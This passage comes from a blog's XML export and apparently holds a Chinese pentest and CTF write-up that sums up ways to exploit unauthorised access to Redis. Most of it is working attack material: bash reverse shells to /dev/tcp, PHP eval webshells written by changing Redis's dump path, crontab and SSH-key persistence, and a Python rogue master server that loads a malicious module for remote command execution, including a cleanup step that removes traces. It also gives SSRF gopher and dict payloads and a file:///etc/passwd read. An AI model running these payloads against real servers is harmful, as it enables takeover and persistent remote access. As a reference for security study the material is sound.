v5oTDvn2QI/ZKrzWPiMX0Un2eynSFOdn399dbo2nfYbBUdF3u296xoYHknzmv1idTSZqOFdDkZFcVB8O/DdvfRXsdk6+S/nRpvfYj/AO5XcUV6hJwfji4uIL7w0sMrokmpIj7H++ld0K5vxZora5pH2aF9k0Lo6PXLWWu6P4n1H7LNqFzbapD8j2rvs+epI2PScR0eWn9xf++K46/8AW08OYb+9gm/vo9ZKeAPEECfufGd2EpuQDPiNq8dxNbeEYJk+1ajOiTp/chrWfTZEUrvR03/ACY/5Y1yOkeAdf8AD2vz6vJ5Ou702J5j/Ola0vi69tf3Op+EtUgeN/keBN6f991xYqE5w906KE+SZsQpsk2f+yVyuqwRal8T/D+kJHs+wp9pern/AAsfw5sdLm6eB9nzp5D70qXwNH/wkHizVfFWH+y7Ps1pvTZ+7rlweGnCfvnTWrc5sfFC+ax8A6r83zTDyE/4HWH4Sgt4/GcPk7/3FlHD89XviMUvrzw5on3Ptt9vk/3ErW8L2Ea6jfXKS73T9zXqfbPLn8R2gooFFaGwV55qulaxoetXer+HkS6+1/6+xnk2fc/jSvQ6btX0FAHlMvxI8R2n/H34Iu0T/YnoT4vyj5ZfCeop/uSJXp7W8cv31VqoXHh7TLgfvLVHrPkM/eOEX4vxI/lv4a1WP/vimy/GGK0GZ/C+rIn999ldr/wiml/8+/61BL4K0ySfzcEU9Q985RPjHb4/f6BrECf33VKvp8W9EI/e22oR/wDbCuj/AOET0/ytmGxVUeDbMR7EegFzmI/xi8Nonzpep/2wrF1Xx58PNX2PqcTu8f3H+yvvj/4HXat4O09weN1Q/wDCBaQ3Lxb6XMVqecTeLvC6f8gzxd4hsvL/AIPvp/4/SQ+Lzv3J8Srz/cn0pPnr06PwPpUce3yU/wC+KkHg3SEnSX7NHlP9igLHnifEm5tHkk/tvStUjCfx2rwvUcfx8treQxXOjzvn+OB//i69HfwbpDvuNsn/AHxR/wAIXpP/AD7R/wDfFAK5w1l8cvD90f3+k38P/bDfW7/wt3wgny/a3T/tjWpL4E0lzE8MfkmP/ZqSHwXoqN5j2aTOf49tVqVqecv4ztvEHxJ0+50+TfZWNu/z7dm/fXqGgad9ntZJOhml86mf8IjpEd0lzDbJHIn9xK30UJ0pfaIUCSiiirLP/9k="></p>
<p>未完待续…..</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>技巧</tag>
        <tag>杂谈</tag>
        <tag>网络安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权访问利用方式总结</title>
    <url>/2021/12/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Redis未授权访问利用方式总结"><a href="#Redis未授权访问利用方式总结" class="headerlink" title="Redis未授权访问利用方式总结"></a>Redis未授权访问利用方式总结</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方下载地址: <a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></p>
<p>编译安装, </p>
<p>或者使用Docker 环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// docker pull redis:4.0</span><br><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>



<h2 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h2><ul>
<li><h4 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<h3 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h3><p>利用crontab反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set x &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.119.1/7777 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<h3 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set x &quot;AAAAB3NzaC1yc2EAAAADAQABAAABgQCzmbxEDVJkRj8CfUb94H//exUqIxTe67ssJBHYJVok9ZVB3g8SYdHrkzrXZpfx5VqgoCEJjNNwuVGP/2R3AK/XgtqYcCAfzWnBRdA8vW5LVzB61wqyYIugQaC9y56x+QTTXuKTltgjpjuBXsAlQ6+5TlPB79qonV/xEsAr7PzxghhtxIZF2A+XTxrTJ4ByfUCvfpZ1ORxNdbnVEWMfSR6RYko9eVkC5AuRiscdYKumrP5Waoj4ET5D+/rRPxE9SPSAIRYs68DZ9mbkKhHgZLVCqNfFp1yZ/t97DfKihn9nRWwQjetSsrqLDbBfhLA0Frq0o+usaevuSL5dgToSwLg5IuWMVvdkcpbK92M9eb7Y0aWgSfGXbkaVegCtriDRYLNK/8rifro1vKwIG1aBcR7NyEe0KGQV9pYO8HPY0TpDq4eDNq1lAGTgND/DAVqXnVce9yPID+XgPhpTt1gxzGdjaNDNSZTotsHppK3EsYsV54QlMseIubHP0DXpgSkLWws=&quot; (PS: 这里内容为公钥 中间的密钥文件)</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -p 10022 -i id_rsa root@127.0.0.1</span><br><span class="line">-p 指定端口</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107903.png" alt="image-20201124124820325"></p>
<h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p><strong>Redis主从复制详解:</strong> </p>
<p><a href="https://www.bbsmax.com/A/l1dyv3Agze/">https://www.bbsmax.com/A/l1dyv3Agze/</a></p>
<p><strong>主从复制流量分析:</strong></p>
<p><a href="https://inhann.top/2021/09/14/redis_master_slave_rce/">https://inhann.top/2021/09/14/redis_master_slave_rce/</a></p>
<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="使用-Docker-搭建"><a href="#使用-Docker-搭建" class="headerlink" title="使用 Docker 搭建"></a>使用 Docker 搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Redis_1</span><br><span class="line">docker run -it -d -p 6380:6379 --name Redis_1 redis:5.0</span><br></pre></td></tr></table></figure>

<h4 id="编译源码搭建"><a href="#编译源码搭建" class="headerlink" title="编译源码搭建"></a>编译源码搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://download.redis.io/releases/redis-5.0.14.tar.gz</span><br><span class="line">tar xvf redis-5.0.14.tar.gz</span><br><span class="line">cd redis-5.0.14</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p><strong>保护模式报错</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107733.png" alt="image-20211203143019591"></p>
<p><strong>解决方式</strong></p>
<p>配置文件中可以关闭保护模式</p>
<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107688.png" alt="image-20211203143103050"></p>
<p><strong>配置绑定ip</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 192.168.56.106 // 或者 0.0.0.0</span><br></pre></td></tr></table></figure>

<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107992.png" alt="image-20211203143328195"></p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108446.png" alt="image-20211203143350114"></p>
<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108939.png" alt="image-20211203143411876"></p>
<h3 id="构建恶意-so-文件"><a href="#构建恶意-so-文件" class="headerlink" title="构建恶意 .so 文件"></a>构建恶意 .so 文件</h3><p>github项目地址: <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd RedisModules-ExecuteCommand</span><br><span class="line">make</span><br><span class="line"># module.so 在src目录下</span><br></pre></td></tr></table></figure>

<p>导入模块方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server ./redis.conf --loadmodule ./module.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h xxxxx</span><br><span class="line">&gt; module load ./module.so</span><br></pre></td></tr></table></figure>

<p><strong>命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure>



<h3 id="脚本探测"><a href="#脚本探测" class="headerlink" title="脚本探测:"></a>脚本探测:</h3><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.56.106 -p 6380 -L 192.168.56.106  -f module.so</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108335.png" alt="image-20211203151828074"></p>
<h3 id="手工探测"><a href="#手工探测" class="headerlink" title="手工探测"></a>手工探测</h3><hr>
<p><strong>恶意Redis服务端模拟脚本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span>(<span class="params">lport</span>):</span></span><br><span class="line">    resp = <span class="string">&quot;&quot;</span></span><br><span class="line">    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>,lport))</span><br><span class="line">    sock.listen(<span class="number">10</span>)</span><br><span class="line">    conn,address = sock.accept()  </span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PING&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp=<span class="string">&quot;+PONG&quot;</span>+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;REPLCONF&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp=<span class="string">&quot;+OK&quot;</span>+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;PSYNC&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;SYNC&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp =  <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(resp) != <span class="built_in">bytes</span>:</span><br><span class="line">                resp =resp.encode()            </span><br><span class="line">            conn.send(resp)    </span><br><span class="line">        <span class="comment">#elif &quot;exit&quot; in data:</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    parser = OptionParser()                     </span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;rogue server listen port, default 21000&quot;</span>, default=<span class="number">21000</span>,metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)        </span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>,<span class="string">&quot;--exp&quot;</span>, dest=<span class="string">&quot;exp&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;Redis Module to load, default exp.so&quot;</span>, default=<span class="string">&quot;exp.so&quot;</span>,metavar=<span class="string">&quot;EXP_FILE&quot;</span>)            </span><br><span class="line"></span><br><span class="line">    (options , args )= parser.parse_args()</span><br><span class="line">    lport = options.lp</span><br><span class="line">    exp_filename = options.exp</span><br><span class="line"></span><br><span class="line">    CLRF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    payload=<span class="built_in">open</span>(exp_filename,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Start listing on port: %s&quot;</span> %lport</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Load the payload:   %s&quot;</span> %exp_filename     </span><br><span class="line">    RogueServer(lport)</span><br></pre></td></tr></table></figure>

<p>运行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python RogueServer.py --lport 8088 --exp exp.so</span><br></pre></td></tr></table></figure>

<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032109720.png" alt="image-20211203201601816"></p>
<p>执行相关命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置redis的备份路径为当前目录</span><br><span class="line">&gt; config set dir ./</span><br><span class="line">#设置备份文件名为exp.so，默认为dump.rdb</span><br><span class="line">&gt; config set dbfilename exp.so</span><br><span class="line">#设置主服务器IP和端口</span><br><span class="line">&gt; slaveof 192.168.56.106 8088</span><br><span class="line">#加载恶意模块</span><br><span class="line">&gt; module load ./exp.so</span><br><span class="line">#切断主从，关闭复制功能</span><br><span class="line">&gt; slaveof no one</span><br><span class="line">#执行系统命令</span><br><span class="line">&gt; system.exec &#x27;whoami&#x27;</span><br><span class="line">&gt; system.rev 127.0.0.1 9999    </span><br><span class="line">#通过dump.rdb文件恢复数据</span><br><span class="line">&gt; config set dbfilename dump.rdb</span><br><span class="line">#删除exp.so</span><br><span class="line">&gt; system.exec &#x27;rm ./exp.so&#x27;</span><br><span class="line">#卸载system模块的加载</span><br><span class="line">&gt; module unload system</span><br></pre></td></tr></table></figure>

<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108634.png" alt="image-20211203201544438"></p>
<h3 id="exp汇总"><a href="#exp汇总" class="headerlink" title="exp汇总"></a>exp汇总</h3><p>[+] 构造恶意so文件:  <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
<p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<p><a href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p>
<p><strong>参考链接:</strong></p>
<p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
<h2 id="SSRF利用方式"><a href="#SSRF利用方式" class="headerlink" title="SSRF利用方式"></a>SSRF利用方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">代替方式: 127.1</span><br><span class="line">[::1]</span><br><span class="line">localhost</span><br><span class="line">转成10进制, 2130706433</span><br></pre></td></tr></table></figure>

<p>通过dict协议利用redis的未授权访问反弹shell的步骤如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1、开启反弹shell的监听</span><br><span class="line">nc -l 9999</span><br><span class="line"># 2、依次执行下面的命令</span><br><span class="line">curl dict://192.168.0.119:6379/set:x:&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">curl dict://192.168.0.119:6379/config:set:dir:/etc/</span><br><span class="line">curl dict://192.168.0.119:6379/config:set:dbfilename:crontab</span><br><span class="line">curl dict://192.168.0.119:6379/bgsave</span><br></pre></td></tr></table></figure>

<h3 id="1-file协议读取文件"><a href="#1-file协议读取文件" class="headerlink" title="1.file协议读取文件"></a>1.file协议读取文件</h3><p>这个协议可以读取系统的一些存放密码的文件，比如说linux的/etc/passwd或者windows的C:/windows/win.ini 等，或者说ctf中的flag文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx/xx/xx.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="2-利用gphper协议"><a href="#2-利用gphper协议" class="headerlink" title="2.利用gphper协议"></a>2.利用gphper协议</h3><p>利用工具gphperus, 生成payload</p>
<p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopherus --exploit redis</span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html): </span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url=gopher://127.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B1%255D%2529%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始内容: 需要两次url编码</span><br><span class="line">gopher://2130706433:6379/_set x &quot;\n\n\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n\n&quot;  </span><br><span class="line">config set dir /var/www/html  </span><br><span class="line">config set dbfilename shell.php  </span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<h3 id="3-利用dict协议"><a href="#3-利用dict协议" class="headerlink" title="3.利用dict协议"></a>3.利用dict协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.20.51:28940/?url=dict://2130706433:6379/info</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.20.51:28940/?url=dict://2130706433:6379/set:x:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span><br><span class="line">shell需要进行utf-8编码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config:set:dir:/var/www/html</span><br><span class="line">config:set:dbfilename:shell.php</span><br><span class="line">set:x:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=dict://2130706433:6379/set:x:&quot;\x3C\x3F\x70\x68\x70\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x50\x4F\x53\x54\x5B\x31\x5D\x29\x3F\x3E&quot;</span><br><span class="line">config:set:dir:/var/www/html</span><br><span class="line">config:set:dbfilename:shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl http://172.16.20.51:28151/?url=dict://2130706433:6379/config:get:dir</span><br><span class="line">-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY)</span><br><span class="line">*2</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$13</span><br><span class="line">/var/www/html</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">将内容转成utf-<span class="number">8</span></span><br><span class="line">s = <span class="string">&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&quot;0xa&quot;</span>,<span class="string">&quot;0x0a&quot;</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">r&quot;\\x&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1])?&gt;</span><br><span class="line">转成utf-8, \\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e 对\进行转义</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://172.16.20.51:28151/?url=dict://2130706433:6379/set:x:\&quot;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e\&quot;</span><br><span class="line">使用 curl 需要对x的键值进行转义</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;</span><br></pre></td></tr></table></figure>







<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="https://zhuanlan.zhihu.com/p/36529010">https://zhuanlan.zhihu.com/p/36529010</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483814&amp;idx=1&amp;sn=572eff495ac4e2f80583c27ddf8fe96b&amp;chksm=cf4d8ec7f83a07d1ad01d06e78c5905508ca32b38681f8c1268cdf0ae7d0f9e3d88e229cf87b">https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483814&amp;idx=1&amp;sn=572eff495ac4e2f80583c27ddf8fe96b&amp;chksm=cf4d8ec7f83a07d1ad01d06e78c5905508ca32b38681f8c1268cdf0ae7d0f9e3d88e229cf87b</a></p>
<p><a href="http://blog.leanote.com/post/snowming/2d9a2082c02b">http://blog.leanote.com/post/snowming/2d9a2082c02b</a></p>
<p>[+] 利用主从复制getshell: <a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>技巧</tag>
        <tag>网络安全</tag>
        <tag>总结</tag>
      </tags>
  </entry>
</search>
